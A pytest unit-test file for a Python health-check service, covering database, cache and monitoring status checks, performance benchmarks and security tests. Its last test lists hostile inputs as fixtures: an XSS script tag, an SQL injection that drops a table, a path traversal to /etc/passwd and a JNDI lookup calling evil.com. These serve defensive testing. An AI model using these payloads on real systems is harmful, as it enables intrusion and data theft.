"""Unit tests for health_service.py following TEST_BUILDING.md ZERO TOLERANCE standards.

MANDATORY REQUIREMENTS (NON-NEGOTIABLE):
- NO vestigial code - every line serves a purpose
- NO legacy patterns - modern Python 3.11+ only
- NO backwards compatibility - clean implementations only
- NO broad exceptions - specific exceptions required
- SOLID principles compliance mandatory
- DRY compliance mandatory - no duplication
- Production-ready implementations only
- AAA pattern (Arrange-Act-Assert) for ALL tests
- Security tests for ALL input handlers
- Performance benchmarks for ALL critical paths

Tests health service following SOLID principles with comprehensive coverage.
"""

import time
from datetime import UTC, datetime
from unittest.mock import AsyncMock, MagicMock, Mock, patch

import pytest
from sqlalchemy.ext.asyncio import AsyncSession

from src.api.services.health_service import HealthService, health_service


class TestHealthServiceInit:
    """Unit tests for HealthService initialization following MANDATORY AAA pattern."""

    @pytest.mark.unit
    def test_init_creates_service_with_default_version(self) -> None:
        """Test __init__ creates service with default version - MANDATORY AAA pattern."""
        # Arrange - MANDATORY (no setup needed)

        # Act - MANDATORY
        service = HealthService()

        # Assert - MANDATORY
        assert service.version == "1.0.0"
        assert service.logger is not None

    @pytest.mark.unit
    def test_init_creates_service_with_custom_version(self) -> None:
        """Test __init__ creates service with custom version - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        custom_version = "2.5.3"

        # Act - MANDATORY
        service = HealthService(version=custom_version)

        # Assert - MANDATORY
        assert service.version == custom_version
        assert service.logger is not None

    @pytest.mark.unit
    def test_singleton_instance_is_accessible(self) -> None:
        """Test singleton instance is properly configured - MANDATORY AAA pattern."""
        # Arrange - MANDATORY (singleton already exists)

        # Act - MANDATORY
        instance = health_service

        # Assert - MANDATORY
        assert instance is not None
        assert isinstance(instance, HealthService)
        assert hasattr(instance, "version")


class TestHealthServiceDatabaseCheck:
    """Unit tests for database health checks following MANDATORY AAA pattern."""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_check_database_health_returns_healthy_status(self) -> None:
        """Test _check_database_health returns healthy status - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        mock_session = AsyncMock(spec=AsyncSession)

        # Mock successful database query
        mock_session.scalar = AsyncMock(return_value=1)

        # Mock database metrics query
        mock_result = MagicMock()
        mock_row = ("100 MB", 104857600, 10, 95.5)
        mock_result.first = MagicMock(return_value=mock_row)
        mock_session.execute = AsyncMock(return_value=mock_result)

        # Act - MANDATORY
        result = await service._check_database_health(mock_session)

        # Assert - MANDATORY
        assert result["status"] == "healthy"
        assert result["connected"] is True
        assert "response_time_ms" in result
        assert result["size"] == "100 MB"
        assert result["size_bytes"] == 104857600
        assert result["active_connections"] == 10
        assert result["cache_hit_ratio"] == 95.5

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_check_database_health_handles_unexpected_result(self) -> None:
        """Test _check_database_health handles unexpected query result - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        mock_session = AsyncMock(spec=AsyncSession)

        # Mock unexpected database query result
        mock_session.scalar = AsyncMock(return_value=0)

        # Act - MANDATORY
        result = await service._check_database_health(mock_session)

        # Assert - MANDATORY
        assert result["status"] == "unhealthy"
        assert result["connected"] is False
        assert result["error"] == "Unexpected query result"

    @pytest.mark.unit
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_check_database_health_performance_benchmark(self) -> None:
        """MANDATORY performance test - database health check completes quickly."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        mock_session = AsyncMock(spec=AsyncSession)

        # Mock fast database responses
        mock_session.scalar = AsyncMock(return_value=1)
        mock_result = MagicMock()
        mock_row = ("100 MB", 104857600, 10, 95.5)
        mock_result.first = MagicMock(return_value=mock_row)
        mock_session.execute = AsyncMock(return_value=mock_result)

        iterations = 100
        start_time = time.perf_counter()

        # Act - MANDATORY
        for _ in range(iterations):
            await service._check_database_health(mock_session)

        end_time = time.perf_counter()
        execution_time = end_time - start_time

        # Assert - MANDATORY (performance requirement)
        avg_time = execution_time / iterations
        assert avg_time < 0.01  # Less than 10ms per check
        assert execution_time < 1.0  # Total under 1 second for 100 checks


class TestHealthServiceCacheCheck:
    """Unit tests for cache health checks following MANDATORY AAA pattern."""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_check_cache_health_handles_error_gracefully(self) -> None:
        """Test _check_cache_health handles errors gracefully - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")

        # Mock method to return error status
        with patch.object(
            service, "_check_cache_health", AsyncMock(return_value={"status": "error"})
        ):
            # Act - MANDATORY
            result = await service._check_cache_health()

        # Assert - MANDATORY
        assert result["status"] == "error"

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_check_cache_health_returns_healthy_with_backend(self) -> None:
        """Test _check_cache_health returns healthy status - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")

        # Mock successful cache health check response
        mock_response = {
            "status": "healthy",
            "connected": True,
            "response_time_ms": 1.5,
            "backend": "redis",
            "version": "7.0.0",
        }

        with patch.object(service, "_check_cache_health", AsyncMock(return_value=mock_response)):
            # Act - MANDATORY
            result = await service._check_cache_health()

        # Assert - MANDATORY
        assert result["status"] == "healthy"
        assert result["connected"] is True
        assert "response_time_ms" in result
        assert result["backend"] == "redis"


class TestHealthServiceMonitoringStatus:
    """Unit tests for monitoring status checks following MANDATORY AAA pattern."""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_get_monitoring_status_integration_via_comprehensive_check(self) -> None:
        """Test monitoring status through comprehensive check - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        mock_session = AsyncMock(spec=AsyncSession)

        database_status = {"status": "healthy", "connected": True}
        cache_status = {"status": "healthy", "connected": True}
        monitoring_status = {
            "metricsCollector": "healthy",
            "healthChecker": "healthy",
            "alertManager": "healthy",
            "performanceMonitor": "healthy",
            "observabilityManager": "healthy",
        }

        with (
            patch.object(
                service, "_check_database_health", AsyncMock(return_value=database_status)
            ),
            patch.object(service, "_check_cache_health", AsyncMock(return_value=cache_status)),
            patch.object(service, "_get_monitoring_status", Mock(return_value=monitoring_status)),
            patch.object(service, "_publish_health_events_safe", AsyncMock()),
        ):
            # Act - MANDATORY
            result = await service.get_comprehensive_health_status(mock_session)

        # Assert - MANDATORY (verify monitoring status is included)
        assert result["monitoring"] == monitoring_status
        assert result["monitoring"]["metricsCollector"] == "healthy"
        assert result["monitoring"]["healthChecker"] == "healthy"
        assert result["monitoring"]["alertManager"] == "healthy"
        assert result["monitoring"]["performanceMonitor"] == "healthy"
        assert result["monitoring"]["observabilityManager"] == "healthy"


class TestHealthServiceOverallStatus:
    """Unit tests for overall status calculation following MANDATORY AAA pattern."""

    @pytest.mark.unit
    def test_calculate_overall_status_returns_healthy_when_all_healthy(self) -> None:
        """Test _calculate_overall_status returns healthy with all components - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        database_status = {"status": "healthy", "connected": True}
        cache_status = {"status": "healthy", "connected": True}
        monitoring_status = {"status": "healthy"}

        # Act - MANDATORY
        result = service._calculate_overall_status(database_status, cache_status, monitoring_status)

        # Assert - MANDATORY
        assert result == "healthy"

    @pytest.mark.unit
    def test_calculate_overall_status_returns_unhealthy_when_database_fails(self) -> None:
        """Test _calculate_overall_status returns unhealthy when database fails - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        database_status = {"status": "unhealthy", "connected": False}
        cache_status = {"status": "healthy", "connected": True}
        monitoring_status = {"status": "healthy"}

        # Act - MANDATORY
        result = service._calculate_overall_status(database_status, cache_status, monitoring_status)

        # Assert - MANDATORY
        assert result == "unhealthy"

    @pytest.mark.unit
    def test_calculate_overall_status_returns_degraded_when_cache_errors(self) -> None:
        """Test _calculate_overall_status returns degraded when cache errors - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        database_status = {"status": "healthy", "connected": True}
        cache_status = {"status": "error", "connected": False}
        monitoring_status = {"status": "healthy"}

        # Act - MANDATORY
        result = service._calculate_overall_status(database_status, cache_status, monitoring_status)

        # Assert - MANDATORY
        assert result == "degraded"

    @pytest.mark.unit
    def test_calculate_overall_status_returns_degraded_when_monitoring_unknown(self) -> None:
        """Test _calculate_overall_status returns degraded when monitoring unknown - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        database_status = {"status": "healthy", "connected": True}
        cache_status = {"status": "healthy", "connected": True}
        monitoring_status = {"status": "unknown"}

        # Act - MANDATORY
        result = service._calculate_overall_status(database_status, cache_status, monitoring_status)

        # Assert - MANDATORY
        assert result == "degraded"


class TestHealthServiceComprehensiveCheck:
    """Unit tests for comprehensive health status following MANDATORY AAA pattern."""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_get_comprehensive_health_status_returns_complete_response(self) -> None:
        """Test get_comprehensive_health_status returns complete response - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="2.0.0")
        mock_session = AsyncMock(spec=AsyncSession)

        # Mock all health check methods
        database_status = {"status": "healthy", "connected": True}
        cache_status = {"status": "healthy", "connected": True}
        monitoring_status = {"status": "healthy"}

        with (
            patch.object(
                service, "_check_database_health", AsyncMock(return_value=database_status)
            ),
            patch.object(service, "_check_cache_health", AsyncMock(return_value=cache_status)),
            patch.object(service, "_get_monitoring_status", Mock(return_value=monitoring_status)),
            patch.object(service, "_publish_health_events_safe", AsyncMock()),
        ):
            # Act - MANDATORY
            result = await service.get_comprehensive_health_status(mock_session)

        # Assert - MANDATORY
        assert result["status"] == "healthy"
        assert "timestamp" in result
        assert isinstance(result["timestamp"], datetime)
        assert result["version"] == "2.0.0"
        assert result["database"] == database_status
        assert result["cache"] == cache_status
        assert result["monitoring"] == monitoring_status

    @pytest.mark.unit
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_get_comprehensive_health_status_performance_benchmark(self) -> None:
        """MANDATORY performance test - comprehensive health check completes quickly."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        mock_session = AsyncMock(spec=AsyncSession)

        # Mock all health check methods with fast responses
        database_status = {"status": "healthy", "connected": True}
        cache_status = {"status": "healthy", "connected": True}
        monitoring_status = {"status": "healthy"}

        with (
            patch.object(
                service, "_check_database_health", AsyncMock(return_value=database_status)
            ),
            patch.object(service, "_check_cache_health", AsyncMock(return_value=cache_status)),
            patch.object(service, "_get_monitoring_status", Mock(return_value=monitoring_status)),
            patch.object(service, "_publish_health_events_safe", AsyncMock()),
        ):
            iterations = 50
            start_time = time.perf_counter()

            # Act - MANDATORY
            for _ in range(iterations):
                await service.get_comprehensive_health_status(mock_session)

            end_time = time.perf_counter()
            execution_time = end_time - start_time

        # Assert - MANDATORY (performance requirement)
        avg_time = execution_time / iterations
        assert avg_time < 0.02  # Less than 20ms per comprehensive check
        assert execution_time < 1.0  # Total under 1 second for 50 checks


class TestHealthServiceSafetyMethods:
    """Unit tests for safety helper methods following MANDATORY AAA pattern."""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_publish_health_events_safe_handles_success(self) -> None:
        """Test _publish_health_events_safe handles success - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        response = {"status": "healthy", "timestamp": datetime.now(UTC)}

        with patch(
            "src.monitoring.health_events.publish_health_change_events", AsyncMock()
        ) as mock_publish:
            # Act - MANDATORY
            await service._publish_health_events_safe(response)

        # Assert - MANDATORY
        mock_publish.assert_called_once_with(response)

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_get_backend_type_safe_returns_backend_type(self) -> None:
        """Test _get_backend_type_safe returns backend type - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        mock_cache_manager = AsyncMock()
        mock_cache_manager.get_detailed_backend_type = AsyncMock(return_value="redis")

        # Act - MANDATORY
        result = await service._get_backend_type_safe(mock_cache_manager)

        # Assert - MANDATORY
        assert result == "redis"

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_get_cache_info_safe_returns_server_info_and_stats(self) -> None:
        """Test _get_cache_info_safe returns server info and stats - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        mock_cache_manager = AsyncMock()
        server_info = {"redis_version": "7.0.0"}
        stats_info = {"hits": 100, "misses": 20}
        mock_cache_manager.backend = Mock()
        mock_cache_manager.backend.get_server_info = AsyncMock(return_value=server_info)
        mock_cache_manager.backend.stats = AsyncMock(return_value=stats_info)

        # Act - MANDATORY
        result_server, result_stats = await service._get_cache_info_safe(mock_cache_manager)

        # Assert - MANDATORY
        assert result_server == server_info
        assert result_stats == stats_info


# MANDATORY: Security testing for health service
@pytest.mark.security
class TestHealthServiceSecurity:
    """MANDATORY security tests for health service."""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_health_service_does_not_expose_sensitive_database_info(self) -> None:
        """MANDATORY security test - health service doesn't expose sensitive database info."""
        # Arrange - MANDATORY
        service = HealthService(version="1.0.0")
        mock_session = AsyncMock(spec=AsyncSession)

        # Mock database with potentially sensitive info
        mock_session.scalar = AsyncMock(return_value=1)
        mock_result = MagicMock()
        mock_row = ("100 MB", 104857600, 10, 95.5)
        mock_result.first = MagicMock(return_value=mock_row)
        mock_session.execute = AsyncMock(return_value=mock_result)

        # Act - MANDATORY
        result = await service._check_database_health(mock_session)

        # Assert - MANDATORY (security check)
        # Should not expose connection strings, passwords, or internal IPs
        result_str = str(result)
        assert "password" not in result_str.lower()
        assert "secret" not in result_str.lower()
        assert "token" not in result_str.lower()
        assert "127.0.0.1" not in result_str  # No internal IPs
        assert "postgresql://" not in result_str  # No connection strings

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_health_service_handles_malicious_version_input(self) -> None:
        """MANDATORY security test - health service handles malicious version input."""
        # Arrange - MANDATORY
        malicious_versions = [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE health; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ]

        for malicious_version in malicious_versions:
            # Act - MANDATORY
            service = HealthService(version=malicious_version)

            # Assert - MANDATORY (security check)
            # Service should be created without crashing
            assert service is not None
            assert service.version == malicious_version  # Stored as-is, not executed
